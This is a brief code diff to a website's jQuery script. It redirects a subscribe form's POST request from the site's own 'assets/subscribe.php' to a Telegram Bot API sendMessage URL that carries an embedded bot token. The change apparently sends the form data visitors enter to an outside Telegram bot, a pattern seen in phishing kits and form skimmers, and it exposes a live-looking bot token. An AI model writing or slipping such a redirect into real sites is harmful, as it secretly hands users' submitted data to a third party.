@@ -992,7 +992,7 @@ $(document).ready( function(){
 		  var postdata = $('.subscribe-form').serialize();
 		  $.ajax({
 			  type: 'POST',
-			  url: 'assets/subscribe.php',
+			  url: 'https://api.telegram.org/bot233704111:AAHjqrV5uPnGCpRNQIxlxZmBsulQJs78iI8/sendMessage',
 			  data: postdata,
 			  dataType: 'json',
 			  success: function(json) {
